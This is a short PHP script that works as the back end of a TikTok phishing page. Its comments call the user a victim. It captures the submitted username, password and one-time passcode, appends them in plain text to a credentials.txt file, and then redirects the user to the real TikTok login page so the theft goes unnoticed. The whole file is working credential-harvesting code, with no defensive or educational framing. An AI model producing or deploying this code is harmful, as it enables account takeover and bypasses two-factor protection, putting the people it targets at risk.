<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username, password, and OTP from the submitted forms
    $username = $_POST['username'] ?? null;
    $password = $_POST['password'] ?? null;
    $otp = $_POST['otp'] ?? null;

    // Open the credentials.txt file to append the captured information
    $file = fopen("credentials.txt", "a");
    
    // Check if the file was opened successfully
    if ($file) {
        // Write the captured credentials to the file
        fwrite($file, "Username: $username, Password: $password, OTP: $otp\n");
        fclose($file);  // Close the file after writing
    }

    // Redirect the victim to the real TikTok login page after capturing the information
    header('Location: https://www.tiktok.com/login');
    exit;
}
?>
